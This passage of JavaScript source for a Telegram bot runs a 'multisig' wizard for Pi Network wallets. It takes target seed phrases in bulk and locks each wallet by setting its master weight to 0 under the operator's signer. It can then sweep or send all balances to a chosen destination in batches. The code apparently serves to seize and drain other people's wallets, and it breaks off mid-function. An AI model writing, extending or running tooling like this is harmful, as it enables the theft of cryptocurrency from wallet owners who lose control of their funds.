        [{ text: `${state.data.network === "testnet" ? "✅ " : ""}Testnet`, callback_data: "multi:network:testnet" }, { text: `${state.data.network === "mainnet" ? "✅ " : ""}Mainnet`, callback_data: "multi:network:mainnet" }],
        [{ text: "❌ Batal", callback_data: "multi:cancel" }],
    ] };
    const text = `<b>Network</b>\nMode: <b>${escapeTelegramHtml(multisigModeLabel(state.data.mode))}</b>`;
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderMultisigHorizonPicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    state.step = "horizon";
    saveMultisigWizard(chatId, state);
    const servers = await listServersWithStats().catch(() => []);
    const rows = [[{ text: `${!state.data.horizon_server_id && !state.data.horizon_url ? "✅ " : ""}Auto default + backup`, callback_data: "multi:horizon:auto" }]];
    servers.slice(0, 20).forEach((server) => rows.push([{ text: `${state.data.horizon_server_id === server.id ? "✅ " : ""}${server.name || "Server"} (${getServerHost(server.url)})`, callback_data: `multi:horizon:server:${server.id}` }]));
    rows.push([{ text: "✍️ Manual Horizon URL", callback_data: "multi:horizon:manual" }]);
    rows.push([{ text: "❌ Batal", callback_data: "multi:cancel" }]);
    const text = "<b>Horizon URL</b>\nPilih server dari Manage Servers, auto, atau input manual.";
    return editQuery ? telegramEditOrSend(editQuery, text, { inline_keyboard: rows }) : telegramSend(chatId, text, { inline_keyboard: rows });
}

async function promptMultisigManualHorizon(chatId, callbackQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, callbackQuery);
    state.step = "horizon_manual";
    saveMultisigWizard(chatId, state);
    const text = "Kirim Manual Horizon URL.\nContoh: <code>https://api.mainnet.minepi.com</code>";
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, multisigCancelKeyboard()) : telegramSend(chatId, text, multisigCancelKeyboard());
}

async function renderMultisigBaseFeePicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    state.step = "base_fee";
    saveMultisigWizard(chatId, state);
    const rows = chunkTelegramButtons(TELEGRAM_MULTISIG_BASE_FEE_OPTIONS.map((fee) => ({ text: `${state.data.base_fee_stroops === fee ? "✅ " : ""}${fee}`, callback_data: `multi:basefee:${fee}` })), 2);
    rows.push([{ text: "✍️ Manual Base Fee", callback_data: "multi:basefee:manual" }]);
    rows.push([{ text: "❌ Batal", callback_data: "multi:cancel" }]);
    const text = "<b>Base Fee Stroops</b>\nPilih base fee untuk transaksi multisig.";
    return editQuery ? telegramEditOrSend(editQuery, text, { inline_keyboard: rows }) : telegramSend(chatId, text, { inline_keyboard: rows });
}

async function renderMultisigDelayPicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    state.step = "delay";
    saveMultisigWizard(chatId, state);
    const rows = chunkTelegramButtons(TELEGRAM_MULTISIG_DELAY_OPTIONS.map((ms) => ({ text: `${String(state.data.batch_delay_ms) === String(ms) ? "✅ " : ""}${Math.round(Number(ms) / 1000)} detik`, callback_data: `multi:delay:${ms}` })), 2);
    rows.push([{ text: "✍️ Manual Delay", callback_data: "multi:delay:manual" }]);
    rows.push([{ text: "❌ Batal", callback_data: "multi:cancel" }]);
    const text = "<b>Delay Antar Batch</b>\nDipakai setelah setiap batch 15 target.";
    return editQuery ? telegramEditOrSend(editQuery, text, { inline_keyboard: rows }) : telegramSend(chatId, text, { inline_keyboard: rows });
}

async function renderMultisigFundingPicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    state.step = "funding";
    saveMultisigWizard(chatId, state);
    const wallets = await listWalletsWithBalances();
    const rows = wallets.slice(0, 30).map((wallet) => [{
        text: `${state.data.fee_payer_id === wallet.id ? "✅ " : ""}${wallet.name || "Funding"} (${shortKey(wallet.public_key, 4)}) - ${wallet.balance_pi || "-"} PI`,
        callback_data: `multi:funding:${wallet.id}`,
    }]);
    if (!rows.length) rows.push([{ text: getTelegramLanguageText("id").addFundingFirst, callback_data: "menu:funding" }]);
    rows.push([{ text: "❌ Batal", callback_data: "multi:cancel" }]);
    const text = "<b>💸 Funding Wallet</b>\nPilih funding wallet untuk bayar fee / fee bump saja.";
    return editQuery ? telegramEditOrSend(editQuery, text, { inline_keyboard: rows }) : telegramSend(chatId, text, { inline_keyboard: rows });
}


async function renderMultisigSignerPicker(chatId, editQuery = null, state = null) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    state.step = "signer";
    saveMultisigWizard(chatId, state);
    const signers = await listMultisigSigners();
    const rows = signers.slice(0, 30).map((signer) => [{
        text: `${state.data.signer_id === signer.id ? "✅ " : ""}${signer.name || "Signer"} (${shortKey(signer.public_key, 4)})`,
        callback_data: `multi:signer:${signer.id}`,
    }]);
    if (!rows.length) {
        rows.push([{ text: tgLang.addSignerFirst || "➕ Add Signer first", callback_data: "multi:add_signer" }]);
    } else {
        rows.push([{ text: tgLang.addSigner || "➕ Add Signer", callback_data: "multi:add_signer" }]);
    }
    rows.push([{ text: "❌ Batal", callback_data: "multi:cancel" }]);
    const text = [
        `<b>${escapeTelegramHtml(tgLang.chooseSignerTitle || "✍️ Choose Signer Wallet")}</b>`,
        escapeTelegramHtml(tgLang.chooseSignerPrompt || "Funding only pays fee. Signer signs target transactions."),
    ].join("\n");
    return editQuery ? telegramEditOrSend(editQuery, text, { inline_keyboard: rows }) : telegramSend(chatId, text, { inline_keyboard: rows });
}

async function promptMultisigAddSigner(chatId, callbackQuery = null) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const currentWizard = getMultisigWizard(chatId);
    telegramControlState.pendingInputs.set(String(chatId), {
        action: "multi_add_signer",
        step: "signer_wallet_phrases",
        data: currentWizard ? { return_to_signer_picker: true, wizard_state: currentWizard } : {},
        created_at: Date.now(),
    });
    const keyboard = telegramBackKeyboard("menu:multisig");
    return callbackQuery ? telegramEditOrSend(callbackQuery, tgLang.addSignerPrompt || "Send signer phrase", keyboard) : telegramSend(chatId, tgLang.addSignerPrompt || "Send signer phrase", keyboard);
}

async function handleMultisigAddSignerInput(message, pending = null) {
    const chatId = message.chat.id;
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const targetInput = await readTelegramTargetInputText(message, { step: "signer_wallet_phrases" }, tgLang);
    const text = targetInput.text;
    if (!text) return telegramSend(chatId, tgLang.inputEmptyFileHint, multisigCancelKeyboard());
    try {
        const lines = normalizeMultisigLines(text);
        const { maxLines } = normalizeTelegramTargetTextFileLimits();
        if (!lines.length) throw new Error(tgLang.inputEmpty || "Input is empty");
        if (lines.length > maxLines) throw new Error(formatTelegramLangText(tgLang.targetTooMany, { max: maxLines }));
        const result = await saveMultisigSignerPhrases(lines.join("\n"));
        telegramControlState.pendingInputs.delete(String(chatId));
        await telegramDeleteUserMessage(message);
        if (targetInput.source === "file") {
            await telegramSend(chatId, formatTelegramLangText(tgLang.targetFileReceived, { filename: escapeTelegramHtml(targetInput.filename), count: lines.length, kind: tgLang.phraseKind || "phrases" }), multisigCancelKeyboard());
        }
        const notice = `${tgLang.signerAdded || "✅ Signer Wallet added"}\nTotal: <b>${result.total}</b> | New: <b>${result.added}</b> | Updated: <b>${result.updated}</b> | Failed: <b>${result.failed}</b>`;
        if (pending?.data?.return_to_signer_picker && pending?.data?.wizard_state) {
            const wizardState = pending.data.wizard_state;
            saveMultisigWizard(chatId, wizardState);
            await telegramSend(chatId, notice, multisigCancelKeyboard());
            return renderMultisigSignerPicker(chatId, null, wizardState);
        }
        return renderMultisigSignerList(chatId, null, notice);
    } catch (err) {
        return telegramSend(chatId, `❌ ${escapeTelegramHtml(err.message || err)}`, multisigCancelKeyboard());
    }
}

async function renderMultisigSignerList(chatId, callbackQuery = null, notice = "") {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const allRows = await listMultisigSigners();
    const rows = allRows.slice(0, 15);
    const lines = [`<b>${escapeTelegramHtml(tgLang.manageSigners || "✍️ Signer Wallets")}</b>`];
    if (notice) {
        lines.push(`<b>${notice}</b>`, "");
    }
    lines.push(`Total: <b>${escapeTelegramHtml(allRows.length)}</b>`, "");
    const buttons = [];
    if (!rows.length) {
        lines.push(tgLang.noSignerWallet || "No signer wallets yet.");
    } else {
        rows.forEach((row, index) => {
            lines.push(`${index + 1}. <b>${escapeTelegramHtml(row.name || "Signer")}</b> | <code>${escapeTelegramHtml(shortKey(row.public_key, 8))}</code> | ${escapeTelegramHtml(formatTelegramStatus(row.status || "active"))}`);
            buttons.push([{ text: `🗑️ ${shortKey(row.public_key, 6)}`, callback_data: `multi:signer:del:${multisigSignerDeleteHash(row)}` }]);
        });
        if (allRows.length > rows.length) {
            lines.push(`...dan ${allRows.length - rows.length} signer lain.`);
        }
    }
    buttons.unshift([{ text: tgLang.addSigner || "➕ Add Signer", callback_data: "multi:add_signer" }]);
    if (rows.length) {
        buttons.push([{ text: tgLang.deleteSigner || "🗑️ Delete Signer", callback_data: "multi:signers:delete_all_confirm" }]);
    }
    buttons.push([{ text: tgLang.back, callback_data: "menu:multisig" }]);
    const keyboard = { inline_keyboard: buttons };
    const output = lines.join("\n");
    return callbackQuery ? telegramEditOrSend(callbackQuery, output, keyboard) : telegramSend(chatId, output, keyboard);
}

async function renderMultisigTargetMode(chatId, editQuery = null, state = null) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    if (state.data.mode === "install_lock") {
        if (state.data.target_source === "saved_list") {
            const savedWallets = await listMultisigSavedWallets();
            if (!savedWallets.length) {
                return editQuery ? telegramEditOrSend(editQuery, tgLang.savedWalletRunEmpty, telegramBackKeyboard("menu:multisig")) : telegramSend(chatId, tgLang.savedWalletRunEmpty, telegramBackKeyboard("menu:multisig"));
            }
            state.data.target_label = `${savedWallets.length} saved wallet`;
            saveMultisigWizard(chatId, state);
            return renderMultisigThresholdPicker(chatId, editQuery, state);
        }
        state.step = "target_phrases";
        saveMultisigWizard(chatId, state);
        const text = tgLang.targetPhrasesPrompt;
        return editQuery ? telegramEditOrSend(editQuery, text, multisigCancelKeyboard()) : telegramSend(chatId, text, multisigCancelKeyboard());
    }
    state.step = "target_mode";
    saveMultisigWizard(chatId, state);
    const keyboard = { inline_keyboard: [
        [{ text: "✅ Pakai semua locked wallet tersimpan", callback_data: "multi:targets:all" }],
        [{ text: "✍️ Input public key target", callback_data: "multi:targets:manual" }],
        [{ text: "❌ Batal", callback_data: "multi:cancel" }],
    ] };
    const text = "<b>Targets</b>\nKosong/all = semua locked wallet yang tersimpan untuk kombinasi Funding + Signer ini.";
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function promptMultisigTargetPublicKeys(chatId, callbackQuery = null, state = null) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, callbackQuery);
    state.step = "target_public_keys";
    saveMultisigWizard(chatId, state);
    const text = tgLang.targetPublicKeysPrompt;
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, multisigCancelKeyboard()) : telegramSend(chatId, text, multisigCancelKeyboard());
}

async function renderMultisigThresholdPicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    state.step = "threshold";
    saveMultisigWizard(chatId, state);
    const rows = [["5", "10"], ["20", "50"]].map((pair) => pair.map((value) => ({ text: `${Number(state.data.threshold) === Number(value) ? "✅ " : ""}${value}`, callback_data: `multi:threshold:${value}` })));
    rows.push([{ text: "✍️ Manual Threshold", callback_data: "multi:threshold:manual" }]);
    rows.push([{ text: "❌ Batal", callback_data: "multi:cancel" }]);
    const text = "<b>Threshold / Signer Weight</b>\nInstall Lock memakai master weight 0 dan signer weight = threshold.";
    return editQuery ? telegramEditOrSend(editQuery, text, { inline_keyboard: rows }) : telegramSend(chatId, text, { inline_keyboard: rows });
}

async function renderMultisigReservePicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    if (!multisigUsesReserve(state.data.mode)) {
        return renderMultisigReview(chatId, editQuery, state);
    }
    state.step = "reserve";
    saveMultisigWizard(chatId, state);
    const rows = chunkTelegramButtons(TELEGRAM_MULTISIG_RESERVE_OPTIONS.map((value) => ({ text: `${state.data.reserve_pi === value ? "✅ " : ""}${value} PI`, callback_data: `multi:reserve:${value}` })), 3);
    rows.push([{ text: "✍️ Manual Reserve", callback_data: "multi:reserve:manual" }]);
    rows.push([{ text: "❌ Batal", callback_data: "multi:cancel" }]);
    const text = state.data.mode === "install_lock"
        ? "<b>Fund Target PI</b>\nJumlah PI yang dikirim dari funding ke setiap target sebelum Set Options. Default 0.5 PI untuk bantu reserve signer."
        : "<b>Reserve PI</b>\nUntuk Send/Claim+Send, sistem memakai reserve terbesar antara manual dan minimum reserve akun.";
    return editQuery ? telegramEditOrSend(editQuery, text, { inline_keyboard: rows }) : telegramSend(chatId, text, { inline_keyboard: rows });
}

async function renderMultisigDestinationPicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    if (!multisigNeedsDestination(state.data.mode)) {
        return renderMultisigReview(chatId, editQuery, state);
    }
    state.step = "destination";
    saveMultisigWizard(chatId, state);
    const destinations = await listDestinations();
    const rows = destinations.slice(0, 30).map((destination) => [{
        text: `${state.data.destination === destination.address ? "✅ " : ""}${destination.name} (${shortKey(destination.address, 4)})`,
        callback_data: `multi:dest:${destination.id}`,
    }]);
    rows.push([{ text: "✍️ Input Manual Address", callback_data: "multi:dest:manual" }]);
    rows.push([{ text: "❌ Batal", callback_data: "multi:cancel" }]);
    const text = "<b>Destination Address</b>\nPilih wallet tujuan atau input manual.";
    return editQuery ? telegramEditOrSend(editQuery, text, { inline_keyboard: rows }) : telegramSend(chatId, text, { inline_keyboard: rows });
}

async function renderMultisigAmountPicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    if (!multisigNeedsAmount(state.data.mode)) {
        return renderMultisigReview(chatId, editQuery, state);
    }
    if (state.data.mode === "sweep_all") {
        state.data.amount = "ALL";
        saveMultisigWizard(chatId, state);
        return renderMultisigReview(chatId, editQuery, state);
    }
    state.step = "amount";
    saveMultisigWizard(chatId, state);
    const keyboard = { inline_keyboard: [
        [{ text: `${String(state.data.amount).toUpperCase() === "ALL" ? "✅ " : ""}ALL / semua setelah reserve`, callback_data: "multi:amount:ALL" }],
        [{ text: "✍️ Input Amount Manual", callback_data: "multi:amount:manual" }],
        [{ text: "❌ Batal", callback_data: "multi:cancel" }],
    ] };
    const text = "<b>Amount</b>\nKosong/ALL = kirim semua saldo setelah reserve.";
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderMultisigReview(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    state.step = "review";
    saveMultisigWizard(chatId, state);
    const data = state.data;
    let targetCount = data.mode === "install_lock"
        ? normalizeMultisigLines(data.target_phrases).length
        : normalizeMultisigLines(data.target_public_keys).length;
    if (data.mode === "install_lock" && data.target_source === "saved_list") {
        targetCount = (await listMultisigSavedWallets()).length;
    }
    if (data.mode !== "install_lock" && !normalizeMultisigLines(data.target_public_keys).length) {
        const lockedRows = await listMultisigLockedWallets().catch(() => []);
        const fundingKey = String(data.funding_public_key || "");
        const signerKey = String(data.signer_public_key || "");
        targetCount = lockedRows.filter((row) =>
            row.network === data.network &&
            String(row.funding_public_key || "") === fundingKey &&
            String(row.signer_public_key || row.funding_public_key || "") === signerKey &&
            String(row.status || "") !== "signer_removed"
        ).length;
    }
    const lines = [
        "<b>✅ Review Multisig</b>",
        `Mode: <b>${escapeTelegramHtml(multisigModeLabel(data.mode))}</b>`,
        `Network: <b>${escapeTelegramHtml(data.network)}</b>`,
        `Horizon: ${escapeTelegramHtml(data.horizon_label || "Auto")}`,
        `Base Fee: <b>${escapeTelegramHtml(data.base_fee_stroops)}</b> stroops`,
        `Batch: <b>${escapeTelegramHtml(data.batch_size)}</b> | Delay: <b>${Math.round(Number(data.batch_delay_ms || 0) / 1000)}</b> detik`,
        `Funding: <b>${escapeTelegramHtml(data.funding_label || "-")}</b>`,
        `Signer: <b>${escapeTelegramHtml(data.signer_label || "-")}</b>`,
        `Targets: <b>${targetCount || (data.mode === "install_lock" ? 0 : "ALL saved for Funding + Signer")}</b>${data.target_source === "saved_list" ? " (Saved Wallet List)" : ""}`,
    ];
    if (data.mode === "install_lock") lines.push(`Threshold/Weight: <b>${escapeTelegramHtml(data.threshold)}</b>`);
    if (multisigUsesReserve(data.mode)) lines.push(`${data.mode === "install_lock" ? "Fund Target" : "Reserve"}: <b>${escapeTelegramHtml(data.reserve_pi)}</b> PI`);
    if (multisigNeedsDestination(data.mode)) lines.push(`Destination: <b>${escapeTelegramHtml(data.destination_label || shortKey(data.destination, 8))}</b>`);
    if (multisigNeedsAmount(data.mode)) lines.push(`Amount: <b>${escapeTelegramHtml(data.amount || "ALL")}</b>`);
    const runText = data.watch_signer_auto
        ? "🔁 Start Watch Signer Auto Install"
        : (data.mode === "install_lock" && data.target_source === "saved_list" ? "🚀 Run Saved Batch" : (data.mode === "install_lock" ? "🚀 Run / Save & Wait Protocol 26" : "🚀 Run Mode"));
    const keyboardRows = [[{ text: "👁️ Preview Targets", callback_data: "multi:preview" }]];
    if (data.mode === "install_lock" && data.target_source !== "saved_list") {
        const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
        keyboardRows.push([{ text: tgLang.saveOnlyButton, callback_data: "multi:save_targets" }]);
    }
    keyboardRows.push([{ text: runText, callback_data: data.watch_signer_auto ? "multi:watch:run" : "multi:run" }]);
    keyboardRows.push([{ text: "🔁 Ulang", callback_data: "multi:start" }, { text: "❌ Batal", callback_data: "multi:cancel" }]);
    const keyboard = { inline_keyboard: keyboardRows };
    const text = lines.join("\n");
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

function renderMultisigResultText(result, title = "Multisig selesai") {
    const lines = [
        `✅ <b>${escapeTelegramHtml(title)}</b>`,
        `Mode: <b>${escapeTelegramHtml(multisigModeLabel(result.mode || "install_lock"))}</b>`,
        `Network: <b>${escapeTelegramHtml(result.network || "-")}</b>`,
        `Total: <b>${escapeTelegramHtml(result.total ?? 0)}</b> | Berhasil: <b>${escapeTelegramHtml(result.success_count ?? 0)}</b>`,
    ];
    if (result.funding_public_key) lines.push(`Funding: <code>${escapeTelegramHtml(shortKey(result.funding_public_key, 8))}</code>`);
    if (result.signer_public_key) lines.push(`Signer: <code>${escapeTelegramHtml(shortKey(result.signer_public_key, 8))}</code>`);
    if (result.stopped) {
        lines.push(`Status: <b>Stopped by admin</b>`);
        if (result.stopped_count !== undefined) lines.push(`Stopped: <b>${escapeTelegramHtml(result.stopped_count)}</b>`);
    }
    if (result.queued) {
        lines.push(`Status: <b>Menunggu Protocol ${escapeTelegramHtml(result.protocol?.required_protocol_version || MULTISIG_REQUIRED_PROTOCOL_VERSION)}</b>`);
        lines.push(`Queued: <b>${escapeTelegramHtml(result.queued_count || 0)}</b>`);
    }
    const rows = Array.isArray(result.results) ? result.results.slice(0, 15) : [];
    if (rows.length) {
        lines.push("", "<b>Result</b>");
        rows.forEach((row, index) => {
            lines.push(`${index + 1}. ${row.success ? "✅" : row.queued ? "⏳" : "❌"} <code>${escapeTelegramHtml(shortKey(row.public_key || row.wallet || "-", 8))}</code>`);
            if (row.hash) lines.push(`   Hash: <code>${escapeTelegramHtml(shortKey(row.hash, 10))}</code>`);
            if (row.fund_pi) lines.push(`   Fund Target: ${escapeTelegramHtml(row.fund_pi)} PI`);
            if (row.claims !== undefined || row.sent_pi !== undefined) lines.push(`   Claims: ${escapeTelegramHtml(row.claims ?? 0)} | Sent: ${escapeTelegramHtml(row.sent_pi || "0.0000000")} PI`);
            if (row.error) lines.push(`   Error: ${escapeTelegramHtml(row.error)}`);
        });
        if ((result.results || []).length > rows.length) lines.push(`...dan ${(result.results || []).length - rows.length} result lain.`);
    }
    return lines.join("\n");
}

async function applySavedWalletTargetsToMultisigState(state) {
    if (state?.data?.mode === "install_lock" && state.data.target_source === "saved_list") {
        const phrases = await getMultisigSavedWalletPhrases();
        if (!phrases.length) {
            const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
            throw new Error(tgLang.savedWalletRunEmpty);
        }
        state.data.target_phrases = phrases.join("\n");
        state.data.target_label = `${phrases.length} saved wallet`;
    }
    return state;
}

async function saveMultisigWizardTargets(chatId, callbackQuery = null, state = null) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, callbackQuery);
    const lines = normalizeMultisigLines(state.data?.target_phrases || "");
    if (!lines.length) throw new Error(tgLang.savedWalletEmpty);
    const loading = await createTelegramLoadingSession({
        chatId,
        callbackQuery,
        lang: tgLang,
        title: tgLang.loadingSavedWallets || "⏳ Saving the Saved Wallet List...",
        subtitle: tgLang.loadingKeepOpen,
        keyboard: multisigCancelKeyboard(),
        estimateMs: Math.min(30000, Math.max(5000, lines.length * 120)),
    });
    try {
        const result = await saveMultisigSavedWalletPhrases(lines.join("\n"));
        telegramControlState.pendingInputs.delete(String(chatId));
        const finalText = [
            `<b>${escapeTelegramHtml(tgLang.savedWalletSavingDone || "✅ Saved Wallet List saved successfully")}</b>`,
            "",
            formatTelegramLangText(tgLang.savedWalletDone, result),
        ].join("\n");
        return await loading.stop(finalText, telegramBackKeyboard("menu:multisig"));
    } catch (err) {
        await loading.stop(`❌ ${escapeTelegramHtml(err.message || err)}`, telegramBackKeyboard("menu:multisig"));
        throw err;
    }
}

function renderMultisigRunProgressText(progress = {}, lang = {}, isSavedList = false) {
    const stage = String(progress.stage || "starting");
    const batchNo = progress.batch_no ?? 0;
    const batchCount = progress.batch_count ?? 0;
    let title = isSavedList ? lang.multisigRunStarting : lang.multisigRunManualStarting;
    if (stage === "prepare") title = lang.multisigRunPreparing;
    if (stage === "protocol") title = lang.multisigRunProtocol;
    if (stage === "queued") title = lang.multisigRunQueued;
    if (stage === "batches_ready") title = formatTelegramLangText(lang.multisigRunBatchStarting, { batch_no: 1, batch_count: batchCount || "?" });
    if (stage === "batch_start") title = formatTelegramLangText(lang.multisigRunBatchStarting, { batch_no: batchNo, batch_count: batchCount });
    if (stage === "batch_done") title = formatTelegramLangText(lang.multisigRunBatchDone, { batch_no: batchNo, batch_count: batchCount });
    if (stage === "delay") title = lang.multisigRunDelay;
    if (stage === "completed") title = lang.multisigRunCompleted;
    if (stage === "stopped") title = lang.multisigRunStopped || "🛑 Batch dihentikan oleh admin.";

    const total = progress.total ?? 0;
    const processed = progress.processed ?? ((progress.success || 0) + (progress.failed || 0));
    const lines = [
        `<b>${escapeTelegramHtml(title || "⏳ Processing...")}</b>`,
        `${escapeTelegramHtml(lang.progressSource || "Source")}: <b>${escapeTelegramHtml(isSavedList ? (lang.savedWalletList || "Saved Wallet List") : "Manual Targets")}</b>`,
    ];
    if (total) {
        lines.push(`${escapeTelegramHtml(lang.progressTargets || "Targets")}: <b>${escapeTelegramHtml(total)}</b>`);
    }
    if (progress.valid !== undefined) {
        lines.push(`${escapeTelegramHtml(lang.progressValid || "Valid")}: <b>${escapeTelegramHtml(progress.valid)}</b>`);
    }
    if (stage === "prepare") {
        lines.push(`${escapeTelegramHtml(lang.progressProcessed || "Processed")}: <b>${escapeTelegramHtml(processed)}/${escapeTelegramHtml(total)}</b>`);
    }
    if (total > 0) {
        const ratioBase = progress.processed !== undefined ? progress.processed : (stage === "prepare" ? processed : ((progress.success || 0) + (progress.failed || 0) + (progress.stopped || 0)));
        const ratio = Math.max(0, Math.min(1, Number(ratioBase || 0) / Number(total || 1)));
        lines.push(`${escapeTelegramHtml(lang.loadingProgress || "Progress")}: <code>${buildTelegramProgressBar(ratio, 10)}</code> <b>${Math.round(ratio * 100)}%</b>`);
    }
    if (batchCount) {
        lines.push(`Batch: <b>${escapeTelegramHtml(batchNo || 0)}/${escapeTelegramHtml(batchCount)}</b>`);
    }
    if (progress.batch_size !== undefined) {
        lines.push(`${escapeTelegramHtml(lang.progressBatchSize || "Batch size")}: <b>${escapeTelegramHtml(progress.batch_size)}</b>`);
    }
    if (progress.batch_mode) {
        const batchModeValue = String(progress.batch_mode);
        const batchModeLabel = batchModeValue === "parallel_isolated_wallet"
            ? (lang.progressBatchModeParallelIsolated || "Parallel per-wallet isolated")
            : (batchModeValue === "isolated_wallet"
                ? (lang.progressBatchModeIsolated || "Per-wallet isolated")
                : batchModeValue);
        lines.push(`${escapeTelegramHtml(lang.progressBatchMode || "Batch mode")}: <b>${escapeTelegramHtml(batchModeLabel)}</b>`);
    }
    if (progress.success !== undefined || progress.failed !== undefined) {
        lines.push(`${escapeTelegramHtml(lang.progressSuccess || "Success")}: <b>${escapeTelegramHtml(progress.success || 0)}</b> | ${escapeTelegramHtml(lang.progressFailed || "Failed")}: <b>${escapeTelegramHtml(progress.failed || 0)}</b>`);
    }
    if (progress.stopped !== undefined) {
        lines.push(`Stopped: <b>${escapeTelegramHtml(progress.stopped || 0)}</b>`);
    }
    if (stage === "delay" && progress.batch_delay_ms) {
        lines.push(`${escapeTelegramHtml(lang.progressDelay || "Delay")}: <b>${Math.round(Number(progress.batch_delay_ms || 0) / 1000)}s</b>`);
    }
    return lines.join("\n");
}

async function runMultisigWizard(chatId, callbackQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, callbackQuery);
    state = await applySavedWalletTargetsToMultisigState(state);
    const payload = buildMultisigPayload(state.data);
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const isSavedList = state.data.target_source === "saved_list";
    const runControl = createTelegramMultisigRun(chatId);
    let loading = null;
    let lastProgressText = "";
    let lastProgressEditAt = 0;
    const progressKeyboard = () => telegramMultisigRunKeyboard(runControl.id, tgLang);
    const cleanLoadingTitle = (value) => String(value || "⏳ Menjalankan Multisig...").replace(/<[^>]+>/g, "").trim();
    const progressRatioFromState = (progress = {}) => {
        const total = Number(progress.total || 0);
        if (!total) return null;
        const processed = Number(progress.processed !== undefined
            ? progress.processed
            : ((progress.success || 0) + (progress.failed || 0) + (progress.stopped || 0)));
        return Math.max(0, Math.min(1, processed / total));
    };
    const sendProgress = async (progress = {}, force = false) => {
        const text = renderMultisigRunProgressText(progress, tgLang, isSavedList);
        const now = Date.now();
        if (!force && text === lastProgressText) {
            return;
        }
        if (!force && now - lastProgressEditAt < 1500) {
            return;
        }
        lastProgressText = text;
        lastProgressEditAt = now;
        const [firstLine, ...detailLines] = text.split("\n");
        if (loading) {
            await loading.update({
                title: cleanLoadingTitle(firstLine),
                subtitle: tgLang.loadingKeepOpen,
                bodyHtml: detailLines.join("\n"),
                progressRatio: progressRatioFromState(progress),
                keyboard: progressKeyboard(),
            });
            return;
        }
        if (callbackQuery) {
            await telegramEditOrSend(callbackQuery, text, progressKeyboard());
        } else {
            await telegramSend(chatId, text, progressKeyboard());
        }
    };

    try {
        let initialTotal = payload.mode === "install_lock"
            ? normalizeMultisigLines(payload.target_phrases).length
            : normalizeMultisigTargets(payload.target_public_keys).length;
        if (!initialTotal && payload.mode !== "install_lock" && state.data.target_source !== "manual") {
            initialTotal = (await listMultisigLockedWallets().catch(() => []))
                .filter((row) => String(row.status || "") !== "signer_removed")
                .length;
        }
        const initialBatchMode = payload.mode === "install_lock" ? "parallel_isolated_wallet" : "parallel_isolated_wallet";
        loading = await createTelegramLoadingSession({
            chatId,
            callbackQuery,
            lang: tgLang,
            title: tgLang.multisigRunStarting || "⏳ Menjalankan Multisig...",
            subtitle: tgLang.loadingKeepOpen,
            keyboard: progressKeyboard(),
            estimateMs: 0,
            progressRatio: initialTotal ? 0 : null,
        });
        await sendProgress({ stage: "starting", total: initialTotal, processed: 0, batch_mode: initialBatchMode }, true);
        payload.on_progress = (progress) => sendProgress(progress, false);
        payload.should_stop = () => isTelegramMultisigRunStopRequested(runControl.id);
        const result = payload.mode === "install_lock"
            ? await executeMultisigInstallLock(payload)
            : await executeMultisigFundingAction(payload);
        await sendProgress({
            stage: result.stopped ? "stopped" : (result.queued ? "queued" : "completed"),
            total: result.total,
            valid: result.queued_count ?? result.success_count,
            success: result.success_count,
            failed: result.failed_count ?? (Array.isArray(result.results) ? result.results.filter((item) => !item.success && !item.queued && !item.stopped).length : 0),
            stopped: result.stopped_count,
            batch_count: result.batch_count,
        }, true);
        telegramControlState.pendingInputs.delete(String(chatId));
        const title = result.stopped ? (tgLang.multisigRunStopped || "Batch dihentikan") : (result.queued ? "Install Lock disimpan" : "Multisig selesai");
        const finalText = renderMultisigResultText(result, title);
        if (loading) {
            return loading.stop(finalText, telegramBackKeyboard("menu:multisig"));
        }
        return telegramSend(chatId, finalText, telegramBackKeyboard("menu:multisig"));
    } catch (err) {
        const errorText = `❌ <b>Multisig gagal</b>\n${escapeTelegramHtml(err.message || err)}`;
        if (loading) {
            return loading.stop(errorText, telegramBackKeyboard("menu:multisig"));
        }
        return telegramSend(chatId, errorText, telegramBackKeyboard("menu:multisig"));
    } finally {
